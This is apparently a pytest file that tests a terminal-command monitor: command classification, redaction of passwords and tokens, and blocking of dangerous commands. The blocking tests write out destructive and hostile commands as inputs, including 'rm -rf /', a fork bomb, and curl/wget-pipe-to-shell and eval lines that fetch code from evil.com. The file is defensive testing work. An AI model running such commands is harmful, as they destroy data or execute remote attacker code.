"""
CORTEX 2.0 - TerminalMonitor Tests

Tests for terminal command monitoring and sanitization.

Author: Asif Hussain
Copyright: © 2024-2025 Asif Hussain. All rights reserved.
"""

import pytest
from pathlib import Path
from unittest.mock import Mock, patch, mock_open
import sys

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts" / "cortex"))

from auto_capture_daemon import TerminalMonitor, MEANINGFUL_COMMANDS, DANGEROUS_PATTERNS, MAX_COMMAND_LENGTH


class TestTerminalMonitor:
    """Test TerminalMonitor component."""
    
    @pytest.fixture
    def mock_callback(self):
        """Create mock callback for command testing."""
        return Mock()
    
    def test_monitor_initialization(self, mock_callback):
        """Should initialize monitor with callback."""
        monitor = TerminalMonitor(mock_callback)
        
        assert monitor.callback == mock_callback
        assert monitor.monitoring == False
        assert hasattr(monitor, '_validate_history_path')
    
    def test_identifies_test_commands(self, mock_callback):
        """Should identify test execution commands."""
        monitor = TerminalMonitor(mock_callback)
        
        command_type = monitor._identify_command_type("pytest tests/")
        assert command_type == "test_execution"
        
        command_type = monitor._identify_command_type("npm test")
        assert command_type == "test_execution"
    
    def test_identifies_build_commands(self, mock_callback):
        """Should identify build commands."""
        monitor = TerminalMonitor(mock_callback)
        
        command_type = monitor._identify_command_type("npm run build")
        assert command_type == "build"
        
        command_type = monitor._identify_command_type("dotnet build")
        assert command_type == "build"
    
    def test_identifies_git_commands(self, mock_callback):
        """Should identify git operations."""
        monitor = TerminalMonitor(mock_callback)
        
        assert monitor._identify_command_type("git commit -m 'test'") == "git_commit"
        assert monitor._identify_command_type("git push origin main") == "git_push"
        assert monitor._identify_command_type("git pull") == "git_pull"
    
    def test_sanitizes_passwords(self, mock_callback):
        """Should redact passwords in commands."""
        monitor = TerminalMonitor(mock_callback)
        
        # Various password formats
        commands = [
            "mysql -u root -p MyPassword123",
            "curl --password secret123 https://api.example.com",
            "psql -h localhost -U user password=Pa$$w0rd",
            "npm login --password mytoken123"
        ]
        
        for cmd in commands:
            sanitized = monitor._sanitize_command(cmd)
            
            # Passwords should be redacted
            assert "[REDACTED]" in sanitized
            assert "MyPassword123" not in sanitized
            assert "secret123" not in sanitized
            assert "Pa$$w0rd" not in sanitized
            assert "mytoken123" not in sanitized
    
    def test_sanitizes_github_tokens(self, mock_callback):
        """Should redact GitHub tokens."""
        monitor = TerminalMonitor(mock_callback)
        
        # GitHub personal access token
        command = "git push https://ghp_abc123xyz456789012345678901234567@github.com/repo.git"
        sanitized = monitor._sanitize_command(command)
        
        # Token should be redacted
        assert "[REDACTED]" in sanitized
        assert "ghp_abc123xyz" not in sanitized
    
    def test_sanitizes_api_keys(self, mock_callback):
        """Should redact API keys and tokens."""
        monitor = TerminalMonitor(mock_callback)
        
        commands = [
            "curl -H 'Authorization: token abc123xyz'",
            "export API_KEY=sk-1234567890abcdef",
            "aws configure set secret_key mysecret123"
        ]
        
        for cmd in commands:
            sanitized = monitor._sanitize_command(cmd)
            assert "[REDACTED]" in sanitized
    
    def test_blocks_malicious_rm_commands(self, mock_callback):
        """Should block dangerous rm commands."""
        monitor = TerminalMonitor(mock_callback)
        
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /*",
            "rm -rf ~/*"
        ]
        
        for cmd in dangerous_commands:
            assert monitor._is_malicious_command(cmd)
    
    def test_blocks_eval_commands(self, mock_callback):
        """Should block eval commands."""
        monitor = TerminalMonitor(mock_callback)
        
        assert monitor._is_malicious_command("eval $(curl evil.com)")
        assert monitor._is_malicious_command('python -c "eval(input())"')
    
    def test_blocks_fork_bombs(self, mock_callback):
        """Should block fork bomb patterns."""
        monitor = TerminalMonitor(mock_callback)
        
        assert monitor._is_malicious_command(":(){ :|:& };:")
        assert monitor._is_malicious_command(":|:")
    
    def test_blocks_pipe_to_shell(self, mock_callback):
        """Should block curl|sh and wget|bash patterns."""
        monitor = TerminalMonitor(mock_callback)
        
        assert monitor._is_malicious_command("curl https://evil.com/script | sh")
        assert monitor._is_malicious_command("wget https://evil.com/script | bash")
    
    def test_allows_safe_commands(self, mock_callback):
        """Should allow safe commands."""
        monitor = TerminalMonitor(mock_callback)
        
        safe_commands = [
            "git status",
            "python main.py",
            "npm install",
            "ls -la",
            "pytest tests/",
            "docker ps"
        ]
        
        for cmd in safe_commands:
            assert not monitor._is_malicious_command(cmd)
    
    def test_rejects_oversized_commands(self, mock_callback):
        """Should reject commands exceeding MAX_COMMAND_LENGTH."""
        monitor = TerminalMonitor(mock_callback)
        
        # Create very long command
        long_command = "x" * (MAX_COMMAND_LENGTH + 1)
        
        # Should not process command
        monitor._process_command_safe(long_command)
        
        # Callback should not be triggered
        mock_callback.assert_not_called()
    
    def test_filters_meaningful_commands(self, mock_callback):
        """Should only process meaningful commands."""
        monitor = TerminalMonitor(mock_callback)
        
        # Meaningful commands
        meaningful = [
            "pytest tests/test_main.py",
            "git commit -m 'fix: bug'",
            "npm run build",
            "python train.py"
        ]
        
        # Non-meaningful commands
        non_meaningful = [
            "ls",
            "cd ..",
            "echo hello",
            "cat file.txt"
        ]
        
        # Verify meaningful commands are detected
        for cmd in meaningful:
            is_meaningful = any(keyword in cmd.lower() for keyword in MEANINGFUL_COMMANDS)
            assert is_meaningful
        
        # Verify non-meaningful commands are ignored
        for cmd in non_meaningful:
            is_meaningful = any(keyword in cmd.lower() for keyword in MEANINGFUL_COMMANDS)
            assert not is_meaningful


class TestTerminalHistoryMonitoring:
    """Test terminal history file monitoring."""
    
    def test_validates_history_path_exists(self):
        """Should validate history file exists."""
        mock_callback = Mock()
        monitor = TerminalMonitor(mock_callback)
        
        # Validation method should exist
        assert hasattr(monitor, '_validate_history_path')
    
    def test_validates_history_path_is_file(self, tmp_path):
        """Should validate history path is a file."""
        mock_callback = Mock()
        monitor = TerminalMonitor(mock_callback)
        
        # Mock home directory
        with patch('pathlib.Path.home', return_value=tmp_path):
            # Create non-file path
            if sys.platform != "win32":
                history_path = tmp_path / ".bash_history"
                history_path.mkdir()  # Create as directory (invalid)
                
                result = monitor._validate_history_path()
                assert not result
    
    def test_validates_history_file_size(self, tmp_path):
        """Should reject history files exceeding MAX_HISTORY_SIZE."""
        mock_callback = Mock()
        monitor = TerminalMonitor(mock_callback)
        
        # Mock home and create oversized history
        with patch('pathlib.Path.home', return_value=tmp_path):
            if sys.platform != "win32":
                history_path = tmp_path / ".bash_history"
                history_path.write_bytes(b"x" * (11 * 1024 * 1024))  # 11MB (over limit)
                
                result = monitor._validate_history_path()
                assert not result


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
